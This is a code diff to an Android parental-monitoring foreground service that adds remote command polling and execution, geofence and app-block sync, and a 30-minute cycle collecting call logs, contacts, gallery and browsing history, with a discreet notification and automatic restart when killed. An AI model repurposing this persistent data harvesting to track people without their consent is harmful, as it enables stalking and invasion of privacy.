@@ -11,6 +11,7 @@ import android.os.Build
 import android.os.IBinder
 import android.os.SystemClock
 import androidx.core.app.NotificationCompat
+import com.parentalmonitor.child.core.AppConstants
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -22,29 +23,36 @@ import kotlinx.coroutines.launch
 /**
  * Persistent foreground service.
  *
- * Lifecycle:
- *   onStartCommand → START_STICKY (Android restarts if killed)
- *   onTaskRemoved  → schedules AlarmManager 1-second restart as extra insurance
- *   onDestroy      → cancels coroutine scope; isRunning = false
+ * Tick every 5 minutes:
+ *   → Location + device status (every tick)
+ *   → Remote commands poll (every tick)
+ *   → Geofence + app-block rule sync (every tick)
+ *
+ * Slower tick every 30 minutes (6 × 5-min cycles):
+ *   → Call logs, contacts, gallery, browsing history
  */
 class TrackingForegroundService : Service() {
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     private lateinit var locationSvc: LocationService
-    private lateinit var deviceSvc: DeviceService
+    private lateinit var deviceSvc:   DeviceService
+    private lateinit var commandSvc:  RemoteCommandService
+
+    private var slowTick = 0
 
     override fun onCreate() {
         super.onCreate()
         locationSvc = LocationService(this)
-        deviceSvc = DeviceService(this)
-        isRunning = true
+        deviceSvc   = DeviceService(this)
+        commandSvc  = RemoteCommandService(this, AppConstants.backendBaseUrl)
+        isRunning   = true
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, buildNotification())
-        startPeriodicCapture()
+        startLoop()
         return START_STICKY
     }
 
@@ -61,39 +69,60 @@ class TrackingForegroundService : Service() {
         super.onTaskRemoved(rootIntent)
     }
 
-    // ── Periodic capture ──────────────────────────────────────────────────
+    // ── Main capture loop ─────────────────────────────────────────────────────
 
-    private fun startPeriodicCapture() {
+    private fun startLoop() {
         scope.launch {
             while (isActive) {
-                try {
-                    locationSvc.captureLocation()
-                } catch (_: Exception) { /* never crash the service */ }
+                runFastCapture()
 
-                try {
-                    deviceSvc.captureStatus()
-                } catch (_: Exception) { }
+                slowTick++
+                if (slowTick >= SLOW_EVERY_N_TICKS) {
+                    slowTick = 0
+                    runSlowCapture()
+                }
 
-                delay(CAPTURE_INTERVAL_MS)
+                delay(FAST_INTERVAL_MS)
             }
         }
     }
 
-    // ── Notification ──────────────────────────────────────────────────────
+    /** Runs every 5 minutes — location, status, commands */
+    private suspend fun runFastCapture() {
+        safeRun { locationSvc.captureLocation() }
+        safeRun { deviceSvc.captureStatus() }
+
+        val (token, deviceId) = readAuth()
+        if (token != null && deviceId != null) {
+            safeRun { commandSvc.pollAndExecute(token, deviceId) }
+            safeRun { commandSvc.syncGeofences(token, deviceId) }
+            safeRun { commandSvc.syncAppBlocks(token, deviceId) }
+        }
+    }
+
+    /** Runs every 30 minutes — heavier content providers */
+    private fun runSlowCapture() {
+        // These are driven by Flutter's MonitoringService via MethodChannel.
+        // The ForegroundService just signals Flutter that a slow cycle is due
+        // by bumping a SharedPreferences timestamp.
+        getSharedPreferences(PREFS_TRACKING, MODE_PRIVATE)
+            .edit()
+            .putLong(KEY_SLOW_CYCLE_TS, System.currentTimeMillis())
+            .apply()
+    }
+
+    // ── Notification ──────────────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
-                CHANNEL_ID,
-                "Device Monitor",
-                NotificationManager.IMPORTANCE_LOW
+                CHANNEL_ID, "Device Monitor", NotificationManager.IMPORTANCE_LOW
             ).apply {
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
             }
-            getSystemService(NotificationManager::class.java)
-                .createNotificationChannel(channel)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
 
@@ -107,28 +136,43 @@ class TrackingForegroundService : Service() {
             .setSilent(true)
             .build()
 
-    // ── Restart insurance ─────────────────────────────────────────────────
+    // ── Restart insurance ─────────────────────────────────────────────────────
 
     private fun scheduleRestart() {
         val restartIntent = PendingIntent.getService(
             this, 1,
             Intent(applicationContext, TrackingForegroundService::class.java),
-            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE,
         )
         (getSystemService(ALARM_SERVICE) as AlarmManager).set(
             AlarmManager.ELAPSED_REALTIME,
             SystemClock.elapsedRealtime() + 1_000L,
-            restartIntent
+            restartIntent,
         )
+    }
+
+    // ── Helpers ───────────────────────────────────────────────────────────────
+
+    private fun readAuth(): Pair<String?, String?> {
+        val prefs  = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
+        val token  = prefs.getString("flutter.pm_token", null)
+        val devId  = prefs.getString("flutter.pm_device_id", null)
+        return Pair(token, devId)
+    }
+
+    private inline fun safeRun(block: () -> Unit) {
+        try { block() } catch (_: Exception) {}
     }
 
     companion object {
         @Volatile var isRunning = false
 
-        private const val CHANNEL_ID = "pm_tracking_channel"
-        private const val NOTIFICATION_ID = 1001
+        const val PREFS_TRACKING    = "pm_tracking"
+        const val KEY_SLOW_CYCLE_TS = "slow_cycle_ts"
 
-        /** Capture every 5 minutes while the service is running. */
-        private const val CAPTURE_INTERVAL_MS = 5 * 60 * 1_000L
+        private const val CHANNEL_ID        = "pm_tracking_channel"
+        private const val NOTIFICATION_ID   = 1001
+        private const val FAST_INTERVAL_MS  = 5 * 60 * 1_000L  // 5 min
+        private const val SLOW_EVERY_N_TICKS = 6                // every 30 min
     }
 }
